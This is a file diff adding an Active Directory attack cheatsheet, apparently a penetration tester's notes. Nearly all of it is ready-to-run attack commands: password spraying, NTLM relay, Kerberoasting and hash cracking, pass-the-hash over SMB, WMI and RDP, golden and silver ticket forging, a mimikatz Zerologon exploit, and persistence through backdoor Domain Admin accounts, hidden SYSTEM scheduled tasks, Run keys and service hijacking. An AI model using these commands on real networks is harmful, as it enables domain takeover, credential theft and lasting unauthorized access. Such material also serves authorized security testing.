@@ -1,0 +1,242 @@
+
+                ---------------------------
+                ------ AD CHEATSHEET ------
+                ---------------------------
+
+***********
+** RECON **
+***********
+
+    $ ldapsearch -x -H ldap://dc01.corp.com -s base -LLL
+
+        get domain, forest, DC version with following table:
+
+    Value   Forest          Domain              Domain Controller
+    0       2000            2000 Mixed/native   2000
+    1       2003 Interim    2003 Interim        N/A
+    2       2003            2003                2003
+    3       2008            2008                2008
+    4       2008 R2         2008 R2             2008 R2
+    5       2012            2012                2012
+    6       2012 R2         2012 R2             2012 R2
+    7       2016            2016                2016
+
+    $ nslookup -type=SRV _kerberos._tcp.corp.com
+        get DCs
+
+    $ certipy find 'corp.com/user:P4ssw0rd@dc01.corp.com'
+        get root CAs
+
+    $ nslookup corp.com
+        get DNS servers
+
+    $ cme smb 10.10.10.0/24 -u user -p P4ssw0rd -d corp.com --shares
+        search for network shares with CrackMapExec
+
+    PS C:\> Get-ADDefaultDomainPasswordPolicy
+        get domain password policy
+
+    PS C:\> Get-ADObject -LDAPFilter "(|(ObjectClass=user)(ObjectClass=computer))" -SearchBase "DC=MEDIC,DC=EX" -Property * |  where description -ne $null | Select Name, Description, ObjectClass
+        get user and computer account with a non void description
+
+****************
+** SHARPHOUND **
+****************
+
+    Collectors:
+
+    PS > runas /netonly /user:corp.com\user powershell
+
+    check that account is logged on with
+
+    PS > net view \\corp.com
+
+    then
+
+    PS > .\SharpHound.exe -d corp.com --domaincontroller domaincontroller.corp.com
+
+***************
+** RESPONDER **
+***************
+
+    in case you are on a machine with no internet connexion and need to setup a responder
+    you need python3-netifaces (ex https://packages.debian.org/stretch/amd64/python3-netifaces/download)
+
+**************
+** PASSWORD **
+**************
+
+    $ sprayhound -U ./users.txt -p Corpcom1 -d corp.com -dc 10.10.10.2
+        test password Medicex1 with every users in users.txt
+
+    In case we have a domain account:
+    $ sprayhound -p Corp2022 -d corp.com -dc 10.10.10.2 -lu user -lp P4ssw0rd
+        let sprayhound search for users, and test password if the user account won't be blocked at next password failure
+
+    Test user as password:
+    $ sprayhound -U ./users.txt -d corp.com -dc 10.10.10.2
+    $ sprayhound -d corp.com -dc 10.10.10.2 -lu user -lp P4ssw0rd
+        
+******************************
+** FIRST ACCOUNT COMPROMISE **
+******************************
+
+    - Network attack (responder, ...)
+    - Kerberoasting, password spraying, ...
+    - Application compromised
+
+****************
+** NTLM RELAY **
+****************
+
+    $ ntlmrelayx.py -t 10.10.10.2 -smb2support
+        10.10.10.2 is the server we want to authenticate to
+
+*******************
+** KERBEROASTING **
+*******************
+
+    $ GetUserSPNs.py -request corp.com/user:P4ssw0rd -outputfile hashes.kerberoast
+        Search for kerberoastable accounts (services run by user accounts and not computer accounts)
+
+    $ hashcat -m 13100 ./hashes.kerberoast /path/to/wordlist.txt
+        Try to break hashes
+
+*******************
+** PASS THE HASH **
+*******************
+
+    $ wmiexec.py $domain/Administrator@$domain_controller_1 -hashes :$nthash
+
+    $ cme smb 10.10.10.0/24 -u user -p P4ssw0rd -d medic.ex --sam
+        use CrackMapExec to try to authenticate with "user" on every computer in network range
+            -> try with the user/password of the local admin of a computer once compromised
+
+        RDP PTH
+    try
+    $ xfreerdp /v:10.0.0.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
+
+    in case there is an error like "Account Restrictions are preventing this user from signing in.", it
+    is probably because Restricted mode is disabled. You can enable it with the administrator privilege
+    $ cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+
+
+
+*******************
+** GOLDEN TICKET **
+*******************
+
+    https://yojimbosecurity.ninja/golden-ticket-with-impacket/
+
+    get domain SID:
+    lookupsid.py user:passwd@hostname with a user:passwd and a hostname already compromised in domain
+
+    then build ticket
+    ticketer.py -nthash [krbtgt_nthash] -domain-sid [domain_sid] -domain [domain_fqdn] random_name
+    and use it:
+    export KRB5CCNAME=~/baduser.ccache; psexec.py -dc-ip [DC_IP] -target-ip [DC_IP] -no-pass -k [domain_fqdn]/random_user@[DC_FQDN]
+
+    or with mimikatz:
+
+    /kerberos::golden /domain:[domain_fqdn] /user:random_user /sid:[domain_sid] /krbtgt:[nthash] /ptt
+
+***************
+** ZEROLOGON **
+***************
+
+    identify if host is vuln:
+    lsadump::Zerologon /target:[TARGET] /account:[TARGET] /null /ntlm
+
+    Standard method using mimikatz:
+
+    lsadump::Zerologon /target:[TARGET] /account:[TARGET] /null /ntlm /exploit
+
+    Alternative method
+    https://dirkjanm.io/a-different-way-of-abusing-zerologon/
+    https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn
+    https://www.thehacker.recipes/ad/movement/netlogon/zerologon
+
+    check if service print spooler is remotely accessible on $TARGET
+    $ rpcdump.py $TARGET | grep -A 6 "spoolsv"
+
+    then
+    $ ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
+
+    and
+    $ dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
+
+    $domain_controller_1 being a machine with domain admin access (not necesseraly a DC)
+    $domain_controller_2 being the actual DC you wish to DCSynchost
+
+    pass the hash of the Administrator account
+    $ wmiexec.py $domain/Administrator@$domain_controller_1 -hashes :$nthash
+
+*****************
+** PERSISTANCE **
+*****************
+
+    Local User
+    PS > net user evil p4ssw0rd /add
+    PS > net localgroup Administrators evil /add
+
+    Domain User
+    PS > net user evil p4ssw0rd /add /domain
+    PS > net group "Domain Admins" evil /add
+
+    Scheduled task
+    schtasks /create /tn EvilTask /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'net user evil p4ssw0rd /add; net localgroup Administrators evil /add'" /sc onlogon /ru System
+
+    RUN keys
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v VeryEvil /t REG_SZ /d "C:\Windows\Temp\OC.exe"
+
+    Service modification
+    sc config AxInstSV binPath= "C:\Windows\Temp\OC.exe" start= auto
+
+    Modifiy domain admins group to give us right to add a member to it
+        -> go to "Security" tab and add the "Write" right to our user
+
+    Silver ticket
+    $ lookupsid.py corp.com/user:P4ssw0rd@dc01.corp.com
+    [...]
+    [*] Domain SID is: S-1-5-21-3526105896-714836913-1342931244
+    [...]
+    $ ticketer.py -nthash <service account hash> -domain-sid S-1-5-21-3526105896-714836913-1342931244 -domain corp.com -spn CIFS/SRV01.corp.com administrator
+
+    Golden ticket
+    $ lookupsid.py corp.com/user:P4ssw0rd@dc01.corp.com
+    [...]
+    [*] Domain SID is: S-1-5-21-3526105896-714836913-1342931244
+    [...]
+    $ ticketer.py -nthash <krbtgt account hash> -domain-sid S-1-5-21-3526105896-714836913-1342931244 -domain corp.com administrator
+
+
+*********
+** RDP **
+*********
+
+    Use FreeRDP to RDP using only the NT hash (and no password)
+    $ freerdp /u:user /d:corp.com /pth:ac1dbef8523bafece1428e067c1b114f /v:dc01.corp.com
+
+    Enable RDP remotely:
+
+    first
+    - run: regedit.exe
+    - file > connect network registry
+    - specify hostname/ip
+    - go to HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
+    - change fDenyTSConnections parameter from 1 to 0
+    then
+    - with psexec or wmiexec or whatever:
+    > reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+    more info: https://theitbros.com/how-to-remotely-enable-remote-desktop-using-powershell/
+
+**********
+** MISC **
+**********
+
+    SAM base contains username and password hashes of LOCAL USERS (NT hash)
+
+    CMD Shell via SMB
+    $ psexec.py corp.com/user:P4ssw0rd@dc01.corp.com
+    if the latter didn't work try with wmiexec
+    $ wmiexec.py corp.com/user:P4ssw0rd@dc01.corp.com
